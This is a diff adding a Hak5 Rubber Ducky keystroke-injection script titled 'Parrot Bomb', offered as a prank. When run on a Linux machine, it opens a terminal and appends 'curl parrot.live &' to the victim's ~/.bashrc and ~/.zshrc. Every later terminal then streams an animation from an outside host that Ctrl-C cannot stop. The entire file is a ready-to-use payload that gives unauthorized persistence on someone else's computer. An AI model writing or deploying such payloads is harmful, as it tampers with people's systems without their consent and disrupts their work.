@@ -1,0 +1,17 @@
+REM Title: Parrot Bomb
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04
+REM Props: Hak5, the community and memes
+REM Version: 1.0
+REM Category: Prank
+REM Starts a terminal parrot every time they open a terminal that you can't ctrl c out of and have to kill the process through gui.
+REM
+REM initialization delay
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 1500
+STRING echo "curl parrot.live &" >> ~/.zshrc && echo "curl parrot.live &" >> ~/.bashrc && exit
+ENTER
